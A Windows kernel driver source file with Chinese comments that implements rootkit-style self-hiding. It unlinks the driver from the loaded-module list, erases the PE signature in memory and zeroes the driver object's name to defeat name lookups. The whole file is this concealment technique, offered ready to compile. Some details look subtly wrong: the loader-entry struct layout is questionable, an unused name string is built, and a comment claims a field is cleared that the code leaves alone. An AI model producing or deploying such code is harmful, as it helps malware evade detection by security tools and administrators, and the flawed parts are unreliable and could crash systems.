```c
// hide_mod.c —— 从 PsLoadedModuleList 摘链 + 清 PE 头特征
// 编译：WDK 10 + MSVC x64，/DRIVER /GS- /KERNEL
#include <ntifs.h>
#include <ntimage.h>

typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG      Flags;
    USHORT     LoadCount;
    USHORT     TlsIndex;
    // ... 后续字段按目标 build 号补
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

static PKLDR_DATA_TABLE_ENTRY FindEntryByBase(PVOID base) {
    UNICODE_STRING name;
    RtlInitUnicodeString(&name, L"[模块名].sys");
    PKLDR_DATA_TABLE_ENTRY e = NULL;
    PLIST_ENTRY head = PsLoadedModuleList.Flink;
    for (PLIST_ENTRY p = head; p != &PsLoadedModuleList; p = p->Flink) {
        PKLDR_DATA_TABLE_ENTRY cur =
            CONTAINING_RECORD(p, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (cur->DllBase == base) { e = cur; break; }
    }
    return e;
}

VOID HideSelfModule(PDRIVER_OBJECT drv) {
    PKLDR_DATA_TABLE_ENTRY e = FindEntryByBase(drv->DriverStart);
    if (!e) return;

    // 1) 双链摘除（ldr / memory / init 三条链都要摘）
    RemoveEntryList(&e->InLoadOrderLinks);
    RemoveEntryList(&e->InMemoryOrderLinks);
    RemoveEntryList(&e->InInitializationOrderLinks);

    // 2) 抹掉 PE 头特征（MZ / PE\0\0 / e_lfanew）
    PUCHAR base = (PUCHAR)drv->DriverStart;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
        if (nt->Signature == IMAGE_NT_SIGNATURE) {
            // 清 e_lfanew 与 Signature；节名可再逐节清
            dos->e_magic = 0x5A4D;   // 保留 MZ，避免某些 CRC 直接判死
            nt->Signature = 0;
        }
    }

    // 3) 抹掉驱动对象里的名字，防 ObReferenceObject→名字反查
    if (drv->DriverName.Buffer) {
        RtlZeroMemory(drv->DriverName.Buffer, drv->DriverName.MaximumLength);
        drv->DriverName.Length = 0;
    }
}
```

